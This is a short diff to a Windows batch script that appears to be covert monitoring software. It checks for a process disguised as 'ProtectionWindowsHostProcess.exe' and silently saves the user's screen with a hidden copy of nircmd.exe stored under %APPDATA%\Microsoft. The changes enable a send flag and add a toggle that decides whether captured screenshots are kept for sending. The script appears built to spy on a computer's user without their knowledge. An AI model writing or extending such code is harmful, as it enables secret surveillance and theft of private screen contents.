@@ -90,11 +90,9 @@ echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 
-set "CheckSend=0"
+set "CheckSend=1"
+set "SENDSCREENSHOT=0"
 set "lastMinute=none"
-
-
-
 
 
 
@@ -1900,6 +1898,7 @@ echo.
 
 
 "%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+if %SENDSCREENSHOT%==0 echo 0 > "%USERPROFILE%\Downloads\screenshot.png"
 
 
 
